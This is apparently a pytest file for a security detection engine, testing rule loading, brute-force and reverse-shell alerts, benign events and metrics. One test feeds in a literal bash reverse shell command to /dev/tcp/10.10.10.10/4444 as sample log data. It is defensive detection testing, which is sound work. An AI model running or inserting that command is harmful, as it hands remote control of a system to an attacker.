"""Tests for Detection Engine, Rule Loader, and pattern matching."""

import pytest
from pathlib import Path

from detection_engine.engine import DetectionEngine
from detection_engine.rule_loader import RuleLoader

RULES_DIR = str(Path(__file__).resolve().parent.parent / "rules")


def test_rule_loader_loads_yaml_rules():
    """RuleLoader loads and validates YAML rules from the rules directory."""
    loader = RuleLoader()
    rules = loader.load_rules_from_directory(RULES_DIR)
    assert len(rules) > 0

    # Verify rule structure
    rule = rules[0]
    assert rule.id is not None
    assert rule.name is not None
    assert rule.severity in ("info", "low", "medium", "high", "critical")
    assert len(rule.compiled_patterns) > 0


@pytest.mark.asyncio
async def test_detection_engine_matches_brute_force():
    """DetectionEngine generates an Alert on SSH brute force pattern."""
    engine = DetectionEngine()
    engine.load_rules(RULES_DIR)

    event = {
        "message": "Failed password for invalid user admin from 192.168.1.100 port 22 ssh2",
        "source_ip": "192.168.1.100",
        "service": "sshd",
        "event_type": "auth_failure",
        "source": "syslog",
    }

    alerts = await engine.process_event(event)
    assert len(alerts) >= 1
    alert = alerts[0]
    assert alert.rule_id == "SX-1001" or "Brute Force" in alert.rule_name
    assert alert.source_ip == "192.168.1.100"
    assert alert.risk_score > 0


@pytest.mark.asyncio
async def test_detection_engine_matches_reverse_shell():
    """DetectionEngine generates a critical alert on reverse shell command pattern."""
    engine = DetectionEngine()
    engine.load_rules(RULES_DIR)

    event = {
        "message": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        "source_ip": "10.0.0.5",
        "source": "syslog",
    }

    alerts = await engine.process_event(event)
    assert len(alerts) >= 1
    matched_names = [a.rule_name.lower() for a in alerts]
    assert any("reverse shell" in name for name in matched_names)


@pytest.mark.asyncio
async def test_detection_engine_benign_event():
    """DetectionEngine produces no alerts for benign traffic."""
    engine = DetectionEngine()
    engine.load_rules(RULES_DIR)

    event = {
        "message": "User bob logged out cleanly from session 42",
        "source_ip": "10.0.0.2",
        "source": "syslog",
    }

    alerts = await engine.process_event(event)
    assert len(alerts) == 0


def test_engine_metrics_and_counters():
    """Engine metrics properly track processed events and rule counts."""
    engine = DetectionEngine()
    loaded = engine.load_rules(RULES_DIR)
    metrics = engine.get_metrics()

    assert metrics["rules_loaded"] == loaded
    assert metrics["events_processed"] == 0
    assert metrics["alerts_generated"] == 0
    assert "uptime_seconds" in metrics

